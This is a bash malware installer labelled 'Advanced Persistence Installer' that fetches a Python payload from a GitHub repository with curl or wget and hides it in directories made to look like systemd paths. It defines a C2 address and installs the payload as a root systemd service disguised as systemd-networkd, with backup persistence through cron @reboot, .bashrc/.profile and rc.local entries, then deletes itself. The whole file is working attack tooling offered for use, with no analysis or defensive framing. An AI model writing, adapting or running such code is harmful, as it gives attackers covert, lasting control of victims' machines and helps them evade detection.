#!/bin/bash
# Advanced Persistence Installer
# Version: 2.1

C2_IP="192.168.1.167"
REPO_URL="https://github.com/mimikr00t/superecon/raw/refs/heads/main/modules"

echo "[+] Starting advanced persistence installation..."

# Create multiple hidden locations
HIDDEN_DIRS=(
    "/usr/lib/systemd/systemd-network"
    "/lib/modules/.cache"
    "/var/tmp/.systemd"
)

for dir in "${HIDDEN_DIRS[@]}"; do
    mkdir -p "$dir" 2>/dev/null
    echo "[+] Created directory: $dir"
done

# Download and install core payload with multiple fallbacks
download_payload() {
    echo "[+] Downloading core payload..."
    
    for dir in "${HIDDEN_DIRS[@]}"; do
        curl -s "$REPO_URL/core.py" -o "$dir/networkd" || \
        wget -q "$REPO_URL/core.py" -O "$dir/networkd"
        
        if [ -f "$dir/networkd" ]; then
            chmod +x "$dir/networkd"
            echo "[+] Payload installed to: $dir/networkd"
            return 0
        fi
    done
    return 1
}

download_payload

# Systemd service for reboot persistence
echo "[+] Installing systemd service..."
cat > /etc/systemd/system/systemd-networkd.service << 'EOF'
[Unit]
Description=Systemd Network Daemon
After=network.target
Wants=network.target
StartLimitIntervalSec=0

[Service]
Type=forking
ExecStart=/usr/bin/python3 /usr/lib/systemd/systemd-network/networkd
Restart=always
RestartSec=10
User=root
WorkingDirectory=/usr/lib/systemd/systemd-network

[Install]
WantedBy=multi-user.target
EOF

# Enable systemd service
systemctl daemon-reload 2>/dev/null
systemctl enable systemd-networkd.service 2>/dev/null
systemctl start systemd-networkd.service 2>/dev/null

# Multiple persistence methods
echo "[+] Installing multiple persistence methods..."

# 1. Cron persistence (primary)
(crontab -l 2>/dev/null | grep -v "networkd"; 
 echo "@reboot sleep 60 && /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd") | crontab - 2>/dev/null

# 2. Profile persistence (secondary)
BASHRC_CMD="nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &"
echo "$BASHRC_CMD" >> ~/.bashrc
echo "$BASHRC_CMD" >> ~/.profile

# 3. RC.Local persistence (tertiary)
if [ -d /etc/rc.d ]; then
    echo "#!/bin/bash" > /etc/rc.d/rc.local
    echo "sleep 120" >> /etc/rc.d/rc.local
    echo "nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &" >> /etc/rc.d/rc.local
    chmod +x /etc/rc.d/rc.local 2>/dev/null
fi

# Start immediately
echo "[+] Starting payload immediately..."
nohup /usr/bin/python3 /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &

# Verify installation
echo "[+] Verifying installation..."
sleep 3
if pgrep -f "python3.*networkd" >/dev/null; then
    echo "[+] Persistence installed successfully"
    echo "[+] Methods: systemd, cron, profile, rc.local"
else
    echo "[-] Service may not be running"
fi

# Self-cleanup
rm -f "$0" 2>/dev/null
